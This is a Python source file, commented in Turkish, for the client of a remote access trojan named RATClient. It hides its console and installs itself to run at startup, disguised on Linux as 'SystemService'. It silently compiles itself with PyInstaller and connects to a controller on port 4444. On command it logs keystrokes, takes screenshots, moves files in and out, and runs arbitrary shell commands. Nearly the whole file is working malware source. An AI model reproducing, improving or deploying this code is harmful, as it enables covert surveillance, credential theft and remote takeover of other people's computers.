#!/usr/bin/env python3
import socket
import subprocess
import sys
import time
import os
import platform
import threading
import json
import struct
import logging
import tempfile
import shutil
from base64 import b85encode, b85decode

# Platforma özel importlar
try:
    import pyautogui
    if platform.system() == 'Linux':
        import Xlib.display  # pyautogui için gerekli
except ImportError:
    pyautogui = None

try:
    import keyboard
except ImportError:
    keyboard = None

# Çapraz platform log ayarı
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(tempfile.gettempdir(), 'client.log')),
        logging.StreamHandler()
    ]
)

SERVER_IP = "127.0.0.1"  # Server IP (aynı makinede localhost)
SERVER_PORT = 4444
SERVER_SCRIPT = "server.py"  # Server script dosyası

class CrossPlatform:
    @staticmethod
    def hide_console():
        """Platforma göre konsolu gizle"""
        if platform.system() == 'Windows':
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except Exception as e:
                logging.error(f"Console hide error: {e}")
    
    @staticmethod
    def get_startup_path():
        """Başlangıç dizinini döndürür"""
        if platform.system() == 'Windows':
            return os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        else:
            return os.path.expanduser('~/.config/autostart')

    @staticmethod
    def add_to_startup():
        """Sisteme kalıcılık ekler"""
        try:
            startup_path = CrossPlatform.get_startup_path()
            os.makedirs(startup_path, exist_ok=True)
            
            if getattr(sys, 'frozen', False):
                src_path = sys.executable
            else:
                src_path = os.path.abspath(__file__)

            if platform.system() == 'Windows':
                try:
                    import win32com.client
                    dst_path = os.path.join(startup_path, os.path.basename(src_path))
                    if not os.path.exists(dst_path + ".lnk"):
                        shell = win32com.client.Dispatch("WScript.Shell")
                        shortcut = shell.CreateShortCut(dst_path + ".lnk")
                        shortcut.Targetpath = sys.executable
                        shortcut.Arguments = f'"{src_path}"'
                        shortcut.WorkingDirectory = os.path.dirname(src_path)
                        shortcut.save()
                except ImportError:
                    # win32com yoksa basit kopyalama yap
                    if not os.path.exists(dst_path):
                        shutil.copy2(src_path, dst_path)
            else:
                desktop_file = f"""[Desktop Entry]
Type=Application
Name=SystemService
Exec={sys.executable} {src_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
                with open(os.path.join(startup_path, 'systemservice.desktop'), 'w') as f:
                    f.write(desktop_file)
                os.chmod(os.path.join(startup_path, 'systemservice.desktop'), 0o755)
        except Exception as e:
            logging.error(f"Startup error: {e}")

class AutoBuilder:
    @staticmethod
    def run_silent_build():
        """Çapraz platform build sistemi"""
        if getattr(sys, 'frozen', False):
            return

        build_script = f"""
        python -m pip install --quiet --upgrade pip
        python -m pip install --quiet pyinstaller pyautogui keyboard
        pyinstaller --onefile {'--noconsole' if platform.system() == 'Windows' else ''} \\
        --hidden-import pyautogui \\
        --hidden-import keyboard \\
        --hidden-import ssl \\
        --hidden-import logging \\
        {'--add-data "client.crt;." --add-data "client.key;."' if os.path.exists('client.crt') else ''} \\
        {'--icon icon.ico' if os.path.exists('icon.ico') and platform.system() == 'Windows' else ''} \\
        {os.path.basename(__file__)}
        """.encode('utf-8')

        try:
            encoded = b85encode(build_script).decode('utf-8')
            temp_dir = tempfile.mkdtemp()
            script_ext = '.bat' if platform.system() == 'Windows' else '.sh'
            script_path = os.path.join(temp_dir, f'_build{script_ext}')
            
            with open(script_path, 'w', encoding='utf-8') as f:
                decoded = b85decode(encoded).decode('utf-8')
                if platform.system() != 'Windows':
                    decoded = '#!/bin/sh\n' + decoded
                f.write(decoded)
            
            if platform.system() != 'Windows':
                os.chmod(script_path, 0o755)

            startup_flags = subprocess.CREATE_NO_WINDOW if platform.system() == 'Windows' else 0
            subprocess.Popen(
                [script_path],
                shell=True,
                cwd=os.getcwd(),
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=startup_flags
            )
        except Exception as e:
            logging.error(f"Build error: {e}")

class RATClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.sock = None
        self.keylogger_running = False
        self.keylogs = []
        self.keylock = threading.Lock()
        self.keylogger_thread = None
        self.screenshot_lock = threading.Lock()
        
        # Başlangıç işlemleri
        CrossPlatform.hide_console()
        CrossPlatform.add_to_startup()
        AutoBuilder.run_silent_build()

    def is_server_running(self):
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(2)
            test_sock.connect((self.server_ip, self.server_port))
            test_sock.close()
            logging.info("Server zaten çalışıyor.")
            return True
        except Exception:
            logging.info("Server çalışmıyor.")
            return False

    def start_server(self):
        try:
            if platform.system() == "Windows":
                subprocess.Popen([sys.executable, SERVER_SCRIPT], creationflags=subprocess.CREATE_NEW_CONSOLE)
            else:
                subprocess.Popen([sys.executable, SERVER_SCRIPT], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            logging.info("Server başlatıldı.")
            time.sleep(3)
        except Exception as e:
            logging.error(f"Server başlatılamadı: {e}")

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server_ip, self.server_port))
                logging.info("Server'a bağlandı.")
                break
            except Exception as e:
                logging.error(f"Bağlantı hatası: {e}. 5 saniye sonra tekrar denenecek...")
                time.sleep(5)

    def send_json(self, data):
        try:
            message = json.dumps(data).encode()
            length = struct.pack('>I', len(message))
            self.sock.sendall(length + message)
        except Exception as e:
            logging.error(f"Veri gönderilemedi: {e}")

    def recv_json(self):
        try:
            raw_length = self.recvall(4)
            if not raw_length:
                return None
            length = struct.unpack('>I', raw_length)[0]
            data = self.recvall(length)
            if not data:
                return None
            return json.loads(data.decode())
        except Exception as e:
            logging.error(f"Veri alınamadı: {e}")
            return None

    def recvall(self, n):
        data = b''
        while len(data) < n:
            packet = self.sock.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def send_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.sock.sendall(chunk)
            self.sock.sendall(b"EOFEOFEOFEOF")
            logging.info(f"Dosya gönderildi: {filepath}")
            return True
        except Exception as e:
            logging.error(f"Dosya gönderme hatası: {e}")
            return False

    def receive_file(self, filepath):
        try:
            with open(filepath, 'wb') as f:
                while True:
                    data = self.sock.recv(4096)
                    if data.endswith(b"EOFEOFEOFEOF"):
                        f.write(data[:-12])
                        break
                    f.write(data)
            logging.info(f"Dosya alındı: {filepath}")
            return True
        except Exception as e:
            logging.error(f"Dosya alma hatası: {e}")
            return False

    def log_keys(self):
        if keyboard is None:
            logging.warning("Keyboard modülü yok, keylogger devre dışı.")
            return
        logging.info("Keylogger başladı.")
        while self.keylogger_running:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                with self.keylock:
                    self.keylogs.append(event.name)

    def start_keylogger(self):
        if self.keylogger_running:
            return False
        self.keylogger_running = True
        self.keylogger_thread = threading.Thread(target=self.log_keys, daemon=True)
        self.keylogger_thread.start()
        return True

    def stop_keylogger(self):
        if not self.keylogger_running:
            return False
        self.keylogger_running = False
        if self.keylogger_thread:
            self.keylogger_thread.join(timeout=1)
        return True

    def get_keylogs(self):
        with self.keylock:
            logs = self.keylogs[:]
            self.keylogs.clear()
        return logs

    def take_screenshot(self):
        """Çapraz platform ekran görüntüsü"""
        if pyautogui is None:
            logging.warning("PyAutoGUI modülü yok, ekran görüntüsü devre dışı.")
            return None
            
        with self.screenshot_lock:
            try:
                if platform.system() == 'Linux':
                    # Linux'ta DISPLAY ayarı
                    display = os.getenv('DISPLAY')
                    if not display:
                        os.environ['DISPLAY'] = ':0'
                
                screenshot = pyautogui.screenshot()
                path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
                screenshot.save(path)
                return path
            except Exception as e:
                logging.error(f"Ekran görüntüsü alınamadı: {e}")
                return None

    def execute_command(self, command):
        """Çapraz platform komut çalıştırma"""
        try:
            if platform.system() == 'Windows':
                result = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.DEVNULL,
                    text=True,
                    timeout=60
                )
            else:
                result = subprocess.check_output(
                    ['/bin/sh', '-c', command],
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.DEVNULL,
                    text=True,
                    timeout=60
                )
            return result
        except subprocess.CalledProcessError as e:
            return e.output
        except Exception as e:
            return str(e)

    def handle_command(self, command):
        cmd = command.get('command')
        args = command.get('args', '')

        if cmd == 'download':
            if os.path.isfile(args):
                self.send_json({'status': 'ready'})
                self.send_file(args)
            else:
                self.send_json({'status': 'error', 'message': 'Dosya bulunamadı'})
        elif cmd == 'upload':
            self.send_json({'status': 'ready'})
            if self.receive_file(args):
                self.send_json({'status': 'success'})
            else:
                self.send_json({'status': 'error', 'message': 'Yükleme başarısız'})
        elif cmd == 'screenshot':
            path = self.take_screenshot()
            if path:
                self.send_json({'status': 'ready'})
                self.send_file(path)
                os.remove(path)
            else:
                self.send_json({'status': 'error', 'message': 'Ekran görüntüsü alınamadı'})
        elif cmd == 'start_keylogger':
            if self.start_keylogger():
                self.send_json({'status': 'success', 'message': 'Keylogger başlatıldı'})
            else:
                self.send_json({'status': 'error', 'message': 'Keylogger zaten çalışıyor'})
        elif cmd == 'stop_keylogger':
            if self.stop_keylogger():
                self.send_json({'status': 'success', 'message': 'Keylogger durduruldu'})
            else:
                self.send_json({'status': 'error', 'message': 'Keylogger çalışmıyor'})
        elif cmd == 'get_keylogs':
            logs = self.get_keylogs()
            if logs:
                temp_file = os.path.join(tempfile.gettempdir(), 'keylogs.txt')
                with open(temp_file, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(logs))
                self.send_json({'status': 'ready'})
                self.send_file(temp_file)
                os.remove(temp_file)
            else:
                self.send_json({'status': 'error', 'message': 'Kayıt yok'})
        elif cmd == 'exit':
            self.send_json({'status': 'success', 'message': 'Çıkılıyor'})
            self.cleanup()
            sys.exit(0)
        elif cmd == 'exec':
            output = self.execute_command(command.get('raw', ''))
            self.send_json({'status': 'success', 'output': output})
        else:
            self.send_json({'status': 'error', 'message': 'Bilinmeyen komut'})

    def cleanup(self):
        self.stop_keylogger()
        if self.sock:
            self.sock.close()
        logging.info("Bağlantı kapatıldı ve temizlendi.")

    def run(self):
        if not self.is_server_running():
            self.start_server()
        self.connect()

        while True:
            command = self.recv_json()
            if command is None:
                logging.warning("Server bağlantısı kapandı.")
                break
            self.handle_command(command)

        self.cleanup()

if __name__ == "__main__":
    client = RATClient(SERVER_IP, SERVER_PORT)
    client.run()